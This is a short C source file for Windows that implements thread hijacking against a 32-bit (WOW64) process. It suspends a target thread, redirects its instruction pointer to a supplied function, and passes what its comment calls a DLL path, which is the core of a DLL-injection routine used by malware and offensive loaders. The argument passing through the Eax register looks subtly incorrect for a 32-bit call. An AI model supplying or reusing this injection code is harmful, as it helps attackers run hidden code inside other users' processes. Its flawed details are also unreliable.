#include "executil.h"
#include "windows.h"
#include "stdio.h"

BOOL HijackTargetThread(IN HANDLE hThread, IN PVOID pFunctionAddress, IN PVOID pArgument) {

	WOW64_CONTEXT ThreadCtx = {};
	ThreadCtx.ContextFlags = CONTEXT_CONTROL | CONTEXT_SEGMENTS | CONTEXT_INTEGER;

	if (!hThread || !pFunctionAddress || !pArgument)
		return FALSE;

	if (Wow64SuspendThread(hThread) == ((DWORD)-1)) {
		printf("[!] SuspendThread Failed With Error: %d \n", GetLastError());
		ResumeThread(hThread);
		return FALSE;
	}

	if (!Wow64GetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] GetThreadContext Failed With Error: %d \n", GetLastError());
		ResumeThread(hThread);
		return FALSE;
	}

	ThreadCtx.Eip = (DWORD)(DWORD_PTR)pFunctionAddress;
	ThreadCtx.Eax = (DWORD)(DWORD_PTR)pArgument; // DLL path as parameter

	if (!Wow64SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error: %d \n", GetLastError());
		ResumeThread(hThread);
		return FALSE;
	}

	if (ResumeThread(hThread) == ((DWORD)-1)) {
		printf("[!] ResumeThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}